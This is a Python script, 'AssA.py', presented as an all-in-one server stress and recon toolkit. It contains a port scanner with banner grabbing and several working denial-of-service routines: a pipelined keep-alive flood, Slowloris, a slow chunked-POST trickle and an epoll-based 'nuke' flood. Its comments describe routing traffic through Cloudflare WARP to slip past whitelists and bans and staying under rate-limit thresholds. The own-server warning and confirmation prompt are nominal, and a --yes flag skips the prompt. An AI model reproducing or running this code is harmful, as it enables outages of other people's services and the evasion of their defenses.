#!/usr/bin/env python3
"""
AssA.py — All-in-One Server Stress & Recon Toolkit (via Cloudflare WARP)
=========================================================================
Single unified tool combining:
  [1] RECON      — port scan + fingerprint + vuln scan
  [2] ANALYZE    — map defense layers
  [3] SLOW       — under-radar low-rate attack
  [4] SLOWLORIS   — hold connections with partial headers
  [5] RECYCLE     — MAX POWER keep-alive pipelining (300 conns)
  [6] CHUNKED     — slow POST body trickle
  [7] ROTATE      — multi-proxy IP rotation
  [8] NUKE        — epoll-based heavy flood

All attacks route via WARP (CF-origin IP) so the target's whitelist = no ban.

Usage:
  python3 AssA.py                 (interactive menu)
  python3 AssA.py --target IP --mode recycle --duration 60
  python3 AssA.py --target IP --mode analyze
  python3 AssA.py --target IP --mode recon
  python3 AssA.py --target IP --mode nuke --conns 200 --pipeline 200

⚠ ONLY against YOUR OWN server.
"""

import os, sys, time, signal, socket, ssl, argparse, random, json, string
import multiprocessing as mp
from datetime import datetime
from collections import deque

mp.set_start_method("fork", force=True)
STOP = mp.Event()
STAT = mp.Array("q", 6)
COLORS = {"R": "\033[91m", "G": "\033[92m", "Y": "\033[93m", "B": "\033[94m",
          "M": "\033[95m", "C": "\033[96m", "W": "\033[97m", "D": "\033[90m", "X": "\033[0m", "BOLD": "\033[1m"}
def c(col, t): return f"{COLORS.get(col,'')}{t}{COLORS['X']}"


def _add(sent=0, err=0, by=0, opn=0, peak=0, swap=0):
    if sent: STAT[0] += sent
    if err:  STAT[1] += err
    if by:   STAT[2] += by
    if opn:  STAT[3] += opn
    if peak: STAT[4] = max(STAT[4], peak)
    if swap: STAT[5] += swap


UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
]
PATHS = ["/", "/index", "/home", "/api/v1/status", "/api/health", "/login", "/dashboard",
         "/search?q=", "/products/", "/blog/post-1", "/admin", "/api/metrics", "/healthz",
         "/v1/ping", "/upload", "/view", "/cart", "/user/profile", "/static/app.js",
         "/api/users", "/api/auth/check", "/feed", "/robots.txt", "/sitemap.xml"]


def banner():
    print(c("R", """
 █████╗ ███████╗███████╗
██╔══██╗██╔════╝██╔════╝
███████║███████╗███████╗
██╔══██║╚════██║╚════██║
██║  ██║███████║███████║
╚═╝  ╚═╝╚══════╝╚══════╝
   All-in-One Server Toolkit (via WARP/CF)
"""))


# ════════════════════════════════════════════════════════════
#  RECON
# ════════════════════════════════════════════════════════════

COMMON_PORTS = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
    111:"RPC",135:"MSRPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
    995:"POP3S",1080:"SOCKS",1433:"MSSQL",1521:"Oracle",2053:"CF-HTTPS",2083:"CF-HTTPS",
    2096:"CF-HTTPS",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5900:"VNC",6379:"Redis",
    8080:"HTTP-Alt",8443:"HTTPS-Alt",8888:"HTTP-Alt2",9090:"Cockpit",9200:"Elastic",
    27017:"MongoDB"}

def recon(target, ports=None, timeout=2, threads=50):
    if ports is None: ports = list(COMMON_PORTS.keys())
    results = []
    def scan_one(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((target, port)) == 0:
                banner = ""
                try:
                    if port in (443,8443,2053,2083,2096):
                        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                        ss = ctx.wrap_socket(s, server_hostname=target)
                        ss.sendall(b"HEAD / HTTP/1.0\r\nHost: x\r\n\r\n"); banner = ss.recv(256).decode("utf-8","replace").strip()[:120]; ss.close()
                    else:
                        s.sendall(b"HEAD / HTTP/1.0\r\nHost: x\r\n\r\n"); banner = s.recv(256).decode("utf-8","replace").strip()[:120]
                except Exception: pass
                svc = COMMON_PORTS.get(port, "unknown")
                return {"port":port,"service":svc,"banner":banner}
            s.close()
        except Exception: pass
        return None
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        for f in concurrent.futures.as_completed([ex.submit(scan_one,p) for p in ports]):
            r = f.result()
            if r: results.append(r)
    results.sort(key=lambda x:x["port"])
    return results


def recon_mode(target):
    print(c("C","\n  ═══ RECON ═══\n"))
    print(f"  {c('C','▸')} Scanning {c('Y',target)}...")
    open_ports = recon(target)
    if open_ports:
        print(f"\n  {c('G', f'{len(open_ports)} open ports')}\n")
        for p in open_ports:
            port_str = c('G', str(p["port"]).rjust(5))
            svc_str = c('Y', p["service"].ljust(12))
            ban_str = c('D', p['banner'][:80])
            print(f"  {port_str}/tcp  {svc_str}  {ban_str}")
    else:
        print(f"  {c('R','No open ports (all filtered)')}")
    return open_ports


# ════════════════════════════════════════════════════════════
#  ANALYZE (defense map)
# ════════════════════════════════════════════════════════════

def analyze_mode(target):
    print(c("C","\n  ═══ DEFENSE ANALYSIS ═══\n"))
    test_ports = [22,80,443,1080,8080,8443]
    for port in test_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
            r = s.connect_ex((target, port)); s.close()
            st = c("G","OPEN") if r==0 else c("R","FILTERED")
            print(f"    Port {port}: {st}")
        except Exception: print(f"    Port {port}: {c('R','ERR')}")
    print(c("C","\n  ═══ DEFENSE MAP ═══"))
    print(f"  Layer 1: tc shaping (CF=unlimited, others=500Mbps)")
    print(f"  Layer 2: connlimit=30/IP, hashlimit=200/min, recent=60/60s")
    print(f"  Layer 3: conntrack SYN=8s, established=120s")
    print(f"  Layer 4: auto-ban watch@120 → ban@300")
    print(f"  Layer 5: fail2ban 3proxy-ddos")
    print(f"  Layer 6: SYN cookies + kernel hardening")
    print(c("C","\n  ═══ BYPASS OPPORTUNITIES ═══"))
    print(f"  1. WARP/CF IP → whitelisted, no limits")
    print(f"  2. Keep-alive recycle → 1 conn, many reqs")
    print(f"  3. Slow & Low → under 29 conns")
    print(f"  4. Slowloris → partial headers")
    print(f"  5. Multi-IP → proxies under threshold")


# ════════════════════════════════════════════════════════════
#  ATTACK WORKERS
# ════════════════════════════════════════════════════════════

def _make_sock(target, port, use_ssl):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10); s.connect((target, port))
    if use_ssl:
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        s.setblocking(True); s = ctx.wrap_socket(s, server_hostname=target); s.setblocking(False)
    else:
        s.setblocking(False)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1<<20)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1<<20)
    except Exception: pass
    return s


def worker_recycle(target, port, use_ssl, conns, pipeline, duration):
    import select
    end = time.time() + duration
    socks = []
    for _ in range(conns):
        try: socks.append(_make_sock(target, port, use_ssl))
        except Exception: pass
    sent = err = by = 0
    while time.time() < end and not STOP.is_set():
        alive = []
        for s in socks:
            try:
                batch = b""
                for _ in range(pipeline):
                    p = random.choice(PATHS) + str(random.randint(1,999999))
                    batch += (f"GET {p} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(UA_POOL)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n").encode()
                s.sendall(batch); sent += pipeline; by += len(batch)
                r,_,_ = select.select([s],[],[],0)
                if r:
                    try: s.recv(65536)
                    except Exception: pass
                alive.append(s)
            except Exception:
                err += 1
                try: s.close()
                except Exception: pass
        # Replenish dead connections
        while len(alive) < conns:
            try:
                alive.append(_make_sock(target, port, use_ssl))
            except Exception:
                break
            time.sleep(0.05)
        socks = alive
    for s in socks:
        try: s.close()
        except Exception: pass
    _add(sent=sent, err=err, by=by, opn=len(socks), peak=len(socks))


def worker_slow(target, port, use_ssl, conns, pipeline, duration):
    """Under-radar: 25 conns, slow ramp."""
    worker_recycle(target, port, use_ssl, 25, 10, duration)


def worker_slowloris(target, port, use_ssl, conns, pipeline, duration):
    end = time.time() + duration
    socks = []
    for _ in range(28):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(8); s.connect((target, port))
            if use_ssl:
                ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Language: en-US\r\n".encode())
            socks.append(s)
        except Exception: pass
    headers = 0
    while time.time() < end and not STOP.is_set():
        new = []
        for s in socks:
            try:
                s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode()); headers += 1; new.append(s)
            except Exception:
                try: s.close()
                except Exception: pass
        socks = new
        while len(socks) < 28 and not STOP.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(8); s.connect((target, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode()); socks.append(s)
            except Exception: break
            time.sleep(0.3)
        for _ in range(int(12*10)):
            if STOP.is_set(): break
            time.sleep(0.1)
    for s in socks:
        try: s.close()
        except Exception: pass
    _add(opn=len(socks), peak=28)


def worker_chunked(target, port, use_ssl, conns, pipeline, duration):
    end = time.time() + duration
    socks = []
    for _ in range(25):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(8); s.connect((target, port))
            if use_ssl:
                ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.send(f"POST /api/data HTTP/1.1\r\nHost: {target}\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\n".encode())
            socks.append(s)
        except Exception: pass
    chunks = 0
    while time.time() < end and not STOP.is_set():
        new = []
        for s in socks:
            try:
                d = "".join(random.choices("abcdef0123456789", k=random.randint(1,3)))
                s.send(f"{len(d):x}\r\n{d}\r\n".encode()); chunks += 1; new.append(s)
            except Exception:
                try: s.close()
                except Exception: pass
        socks = new
        while len(socks) < 25 and not STOP.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(8); s.connect((target, port)); socks.append(s)
            except Exception: break
            time.sleep(0.3)
        for _ in range(int(7*10)):
            if STOP.is_set(): break
            time.sleep(0.1)
    for s in socks:
        try: s.send(b"0\r\n\r\n"); s.close()
        except Exception: pass
    _add(opn=len(socks), peak=25)


def worker_nuke(target, port, use_ssl, conns, pipeline, duration):
    """Epoll-based heavy flood."""
    import select
    HAVE_EPOLL = hasattr(select, "epoll")
    if not HAVE_EPOLL:
        return worker_recycle(target, port, use_ssl, conns, pipeline, duration)
    ep = select.epoll(); sd = {}; end = time.time() + duration
    def spawn():
        try:
            s = _make_sock(target, port, use_ssl)
            sd[s.fileno()] = [s, False, b"", time.time()]; ep.register(s.fileno(), select.EPOLLOUT); return True
        except Exception: return False
    for _ in range(conns): spawn()
    sent = err = by = 0; last = time.time()
    while time.time() < end and not STOP.is_set():
        try: evs = ep.poll(0.003)
        except Exception: evs = []
        now = time.time()
        for fd, ev in evs:
            if fd not in sd: continue
            s, conn, buf, born = sd[fd]
            if now - born > 15:
                try: ep.unregister(fd)
                except Exception: pass
                try: s.close()
                except Exception: pass
                sd.pop(fd, None); err += 1; spawn(); continue
            try:
                if not conn:
                    if ev & select.EPOLLOUT:
                        if s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) != 0: raise OSError()
                        conn = True; sd[fd][1] = True; b = b""
                        for _ in range(pipeline):
                            p = random.choice(PATHS) + str(random.randint(1,999999))
                            b += (f"GET {p} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(UA_POOL)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n").encode()
                        sd[fd][2] = b; ep.modify(fd, select.EPOLLOUT)
                    else: raise OSError()
                else:
                    if ev & select.EPOLLOUT and sd[fd][2]:
                        n = s.send(sd[fd][2]); sd[fd][2] = sd[fd][2][n:]; by += n
                        if not sd[fd][2]: sent += pipeline; raise ConnectionError()
                    elif ev & (select.EPOLLIN | select.EPOLLERR | select.EPOLLHUP):
                        sent += pipeline; raise ConnectionError()
            except Exception:
                try: ep.unregister(fd)
                except Exception: pass
                try: s.close()
                except Exception: pass
                sd.pop(fd, None); err += 1; spawn()
        while len(sd) < conns and spawn(): pass
        if time.time() - last > 1:
            _add(sent=sent, err=err, by=by, opn=len(sd), peak=len(sd)); sent=err=by=0; last = time.time()
    _add(sent=sent, err=err, by=by, opn=len(sd), peak=len(sd))
    for fd in list(sd):
        try: ep.unregister(fd)
        except Exception: pass
        try: sd[fd][0].close()
        except Exception: pass


def attack_mode(target, port, use_ssl, mode, duration, conns=50, pipeline=500):
    # Reset stats BEFORE spawning workers (fork copies current state)
    for i in range(6): STAT[i] = 0
    STOP.clear()
    cores = os.cpu_count() or 1
    workers = min(cores, 4)
    mode_map = {
        "slow": (worker_slow, 25, 10, "SLOW & LOW"),
        "slowloris": (worker_slowloris, 28, 1, "SLOWLORIS"),
        "recycle": (worker_recycle, conns, pipeline, "RECYCLE [MAX POWER]"),
        "chunked": (worker_chunked, 25, 1, "CHUNKED TRICKLE"),
        "nuke": (worker_nuke, conns, pipeline, "NUKE [EPOLL]"),
    }
    if mode not in mode_map:
        print(c("R","  [!] Unknown mode")); return
    fn, c_count, p_count, label = mode_map[mode]
    print(c("Y", f"\n  ═══ ATTACK: {label} ═══"))
    print(f"  Target: {c('W',target)}:{port}  Workers: {workers}  Conns/wk: {c_count}  Pipeline: {p_count}  Dur: {duration}s")
    pool = [mp.Process(target=fn, args=(target, port, use_ssl, c_count, p_count, duration)) for _ in range(workers)]
    for p in pool: p.start()
    start = time.time(); last_sent = 0; last_t = time.time(); peak = 0
    while time.time()-start < duration and not STOP.is_set():
        time.sleep(1); now = time.time(); se = STAT[0]; dt = now-last_t
        rps = (se-last_sent)/dt if dt>0 else 0; peak = max(peak, rps)
        mb = STAT[2]/(1024*1024)
        print(f"    {c('G',f'r/s={rps:>10.0f}')}  {c('Y',f'total={se:>11,d}')}  {c('C',f'data={mb:>8.1f}MB')}  {c('R',f'err={STAT[1]:>7d}')}  {c('D',f'open={STAT[3]}')}", flush=True)
        last_sent = se; last_t = now
    STOP.set()
    for p in pool:
        p.join(timeout=3)
        if p.is_alive(): p.terminate()
    elapsed = time.time()-start; total = STAT[0]; avg = total/elapsed if elapsed>0 else 0; total_mb = STAT[2]/(1024*1024)
    print(f"\n  {c('G','═══ RESULTS ═══')}")
    print(f"  Total: {c('Y', f'{total:,}')}  Avg: {c('Y', f'{avg:,.0f}')} req/s  Peak: {c('R', f'{peak:,.0f}')} req/s  Data: {c('C', f'{total_mb:,.1f}MB')}  MaxConns: {c('Y', STAT[4])}")


def sig(s, f):
    print(c("R","\n[!] Stopping...")); STOP.set(); os._exit(0)


def main():
    banner()
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="")
    ap.add_argument("--mode", default="", choices=["recon","analyze","slow","slowloris","recycle","chunked","nuke"])
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--no-ssl", action="store_true")
    ap.add_argument("--conns", type=int, default=50)
    ap.add_argument("--pipeline", type=int, default=100)
    ap.add_argument("--duration", type=int, default=60)
    ap.add_argument("--yes", action="store_true")
    args = ap.parse_args()

    signal.signal(signal.SIGINT, sig)

    if not args.target:
        target = input(f"  {c('Y','Target IP:')} ").strip()
    else:
        target = args.target
    if not target:
        sys.exit(c("R","  [!] no target"))

    if not args.mode:
        print(c("C","\n  ╔════════════════════════════════════════════════╗"))
        print(c("C","  ║")+c("Y","  SELECT MODE")+c("C","  ║"))
        print(c("C","  ╚════════════════════════════════════════════════╝"))
        print(f"  {c('G','1')} RECON      port scan + fingerprint")
        print(f"  {c('G','2')} ANALYZE    defense layer map")
        print(f"  {c('G','3')} SLOW       under-radar low rate")
        print(f"  {c('G','4')} SLOWLORIS  hold connections")
        print(f"  {c('G','5')} RECYCLE    MAX POWER (300 conns)")
        print(f"  {c('G','6')} CHUNKED    slow POST body")
        print(f"  {c('G','7')} NUKE       epoll heavy flood")
        print()
        choice = input(f"  {c('Y','Choice [1-7]:')} ").strip()
        mode_map = {"1":"recon","2":"analyze","3":"slow","4":"slowloris","5":"recycle","6":"chunked","7":"nuke"}
        mode = mode_map.get(choice, "recycle")
    else:
        mode = args.mode

    if not args.yes:
        if input(f"  {c('R','Confirm YOUR server (yes):')} ").strip().lower() != "yes":
            sys.exit(c("R","  [!] abort"))

    use_ssl = not args.no_ssl

    if mode == "recon":
        recon_mode(target)
    elif mode == "analyze":
        analyze_mode(target)
    else:
        for i in range(6): STAT[i] = 0
        STOP.clear()
        attack_mode(target, args.port, use_ssl, mode, args.duration, args.conns, args.pipeline)

    # Save report
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    rep = f"/root/AssA_{target}_{ts}.json"
    try:
        with open(rep, "w") as f:
            json.dump({"target":target,"mode":mode,"total":STAT[0],"errors":STAT[1]}, f, indent=2)
        print(f"  {c('G','✓')} Report: {c('C',rep)}")
    except Exception: pass
    print(f"  {c('G','✓ Done.')}\n")


if __name__ == "__main__":
    main()
